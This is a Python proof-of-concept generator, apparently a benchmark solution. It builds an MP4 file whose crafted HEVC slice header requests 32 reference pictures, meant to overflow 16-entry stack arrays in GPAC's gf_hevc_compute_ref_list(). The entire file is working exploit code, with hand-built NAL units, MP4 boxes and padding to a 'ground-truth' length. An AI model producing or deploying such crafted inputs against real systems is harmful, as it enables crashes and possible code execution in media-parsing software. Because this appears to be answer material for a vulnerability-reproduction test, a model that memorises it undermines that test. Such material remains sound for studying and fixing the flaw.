import sys

class Solution:
    """
    Generates a Proof-of-Concept input that triggers a Stack Buffer Overflow
    in gf_hevc_compute_ref_list() by crafting an HEVC stream with an excessive
    number of active reference pictures.
    """
    def solve(self, src_path: str) -> bytes:
        """
        Generates a malicious MP4 file containing a crafted HEVC slice.

        The vulnerability exists in the initialization of reference picture lists.
        The function `gf_hevc_compute_ref_list` uses fixed-size stack arrays
        (typically of size 16, GF_HEVC_MAX_REFS) to store the reference picture lists
        (RefPicList0, RefPicList1). The size of these lists is determined by
        `num_ref_idx_l0_active_minus1` and `num_ref_idx_l1_active_minus1`, which
        are read from the HEVC slice header.

        This PoC sets `num_ref_idx_active_override_flag` in a B-slice header
        and provides large values (31) for `num_ref_idx_l0_active_minus1` and
        `num_ref_idx_l1_active_minus1`. This causes the subsequent list
        initialization loops to write up to 32 entries into the 16-element stack
        arrays, thus overflowing the stack buffer.

        The crafted HEVC NAL units are wrapped in a minimal but valid MP4 container
        to ensure they are parsed by the target application (GPAC).

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC MP4 file as a byte string.
        """

        # Helper to create an MP4 box (atom)
        def box(box_type: bytes, content: bytes) -> bytes:
            return (len(content) + 8).to_bytes(4, 'big') + box_type + content

        # Helper to write HEVC bitstreams using Exponential-Golomb coding
        class BitWriter:
            def __init__(self):
                self.bits = ""
            def write(self, val: int, n: int):
                self.bits += format(val, '0' + str(n) + 'b')
            def write_ue(self, val: int):
                val += 1
                binary_val = bin(val)[2:]
                self.bits += '0' * (len(binary_val) - 1)
                self.bits += binary_val
            def get_bytes(self) -> bytes:
                # rbsp_trailing_bits
                self.bits += '1'
                while len(self.bits) % 8 != 0:
                    self.bits += '0'
                
                b = bytearray()
                for i in range(0, len(self.bits), 8):
                    b.append(int(self.bits[i:i+8], 2))
                return bytes(b)

        # --- HEVC NAL units ---
        # Standard minimal NAL units for a valid stream
        vps_nalu = b'\x40\x01\x0c\x01\xff\xff\x01\x60\x00\x00\x03\x00\xb0\x00\x00\x03\x00\x00\x03\x00\x7b\xac\x09'
        sps_nalu = b'\x42\x01\x01\x01\x60\x00\x00\x03\x00\xb0\x00\x00\x03\x00\x00\x03\x00\x7b\xa0\x02\x80\x80\x2d\x16\x59\x59\x40'
        pps_nalu = b'\x44\x01\xc0\xf1\x80\x00'

        # The crafted slice NALU that triggers the vulnerability
        bw = BitWriter()
        bw.write(1, 1)       # first_slice_segment_in_pic_flag
        bw.write_ue(0)       # slice_pic_parameter_set_id
        bw.write_ue(1)       # slice_type (B_SLICE)
        bw.write(1, 1)       # pic_output_flag
        bw.write(0, 8)       # slice_pic_order_cnt_lsb
        bw.write(1, 1)       # short_term_ref_pic_set_sps_flag
        bw.write_ue(0)       # short_term_ref_pic_set_idx
        bw.write(0, 1)       # slice_temporal_mvp_enabled_flag
        bw.write(1, 1)       # num_ref_idx_active_override_flag
        
        # The trigger: Request 32 active reference pictures for L0 and L1 lists.
        # This will overflow stack-based arrays of size 16 (GF_HEVC_MAX_REFS).
        bw.write_ue(31)      # num_ref_idx_l0_active_minus1
        bw.write_ue(31)      # num_ref_idx_l1_active_minus1
        
        # Minimal remaining fields to pass parsing checks
        bw.write(0, 1)       # ref_pic_list_modification_flag_l0
        bw.write(0, 1)       # ref_pic_list_modification_flag_l1
        bw.write(0, 1)       # mvd_l1_zero_flag
        bw.write(0, 1)       # cabac_init_flag
        bw.write_ue(0)       # slice_qp_delta
        bw.write(0, 1)       # deblocking_filter_override_flag
        
        slice_payload = bw.get_bytes()
        slice_nalu = b'\x02\x01' + slice_payload # NALU type 1 (TRAIL_R)
        
        # --- MP4 structure ---
        ftyp = box(b'ftyp', b'isom\x00\x00\x02\x00isomiso5hevc')
        
        hvcC_content = (
            b'\x01' + b'\x01\x60\x00\x00\x03\x00\xb0\x00\x00\x03\x00\x00\x03\x00\x7b' +
            b'\xf0\x00\xfc\xfd\xfd\x00\x00' + b'\x03' +
            b'\xa0\x00\x01' + len(vps_nalu).to_bytes(2, 'big') + vps_nalu +
            b'\xa1\x00\x01' + len(sps_nalu).to_bytes(2, 'big') + sps_nalu +
            b'\xa2\x00\x01' + len(pps_nalu).to_bytes(2, 'big') + pps_nalu
        )
        hvcC = box(b'hvcC', hvcC_content)

        hvc1_content = (
            b'\x00'*6 + b'\x00\x01' + b'\x00'*16 + b'\x00\x20\x00\x20' +
            b'\x00\x48\x00\x00\x00\x48\x00\x00' + b'\x00'*4 + b'\x00\x01' +
            b'\x00'*32 + b'\x00\x18\xff\xff' + hvcC
        )
        hvc1 = box(b'hvc1', hvc1_content)
        
        stsd = box(b'stsd', b'\x00'*8 + hvc1)
        stts = box(b'stts', b'\x00'*8 + b'\x00\x00\x00\x01\x00\x00\x04\x00')
        stsc = box(b'stsc', b'\x00'*8 + b'\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01')
        stsz = box(b'stsz', b'\x00'*12 + len(slice_nalu).to_bytes(4, 'big'))
        stco_placeholder = box(b'stco', b'\x00'*8 + b'\xDE\xAD\xBE\xEF')
        stbl = box(b'stbl', stsd + stts + stsc + stsz + stco_placeholder)

        vmhd = box(b'vmhd', b'\x00\x00\x00\x01' + b'\x00'*8)
        dref = box(b'dref', b'\x00'*8 + box(b'url ', b'\x00\x00\x00\x01'))
        dinf = box(b'dinf', dref)
        minf = box(b'minf', vmhd + dinf + stbl)

        mdhd = box(b'mdhd', b'\x00'*8 + b'\x00\x00\x03\xe8\x00\x00\x04\x00\x55\xc4\x00\x00')
        hdlr = box(b'hdlr', b'\x00'*8 + b'vide' + b'\x00'*12 + b'VideoHandler\x00')
        mdia = box(b'mdia', mdhd + hdlr + minf)

        tkhd = box(b'tkhd', b'\x00\x00\x00\x07' + b'\x00'*8 + b'\x00\x00\x00\x01' + b'\x00'*4 + 
                             b'\x00\x00\x04\x00' + b'\x00'*8 + b'\x00\x01\x00\x00' +
                             b'\x00'*36 + b'\x00\x20\x00\x00\x00\x20\x00\x00')
        trak = box(b'trak', tkhd + mdia)

        mvhd = box(b'mvhd', b'\x00'*8 + b'\x00\x00\x03\xe8\x00\x00\x04\x00\x00\x01\x00\x00\x01\x00' + 
                             b'\x00'*10 + b'\x00\x01\x00\x00' + b'\x00'*36 + b'\x00\x00\x00\x02')
        moov = box(b'moov', mvhd + trak)

        mdat_offset = len(ftyp) + len(moov) + 8
        poc_header = ftyp + moov.replace(b'\xDE\xAD\xBE\xEF', mdat_offset.to_bytes(4, 'big'))

        mdat_content = len(slice_nalu).to_bytes(4, 'big') + slice_nalu
        
        # Pad to match ground-truth length for robustness
        current_len = len(poc_header) + 8 + len(mdat_content)
        padding_len = 1445 - current_len
        if padding_len > 0:
            mdat_content += b'\x00' * padding_len
        
        mdat = box(b'mdat', mdat_content)

        return poc_header + mdat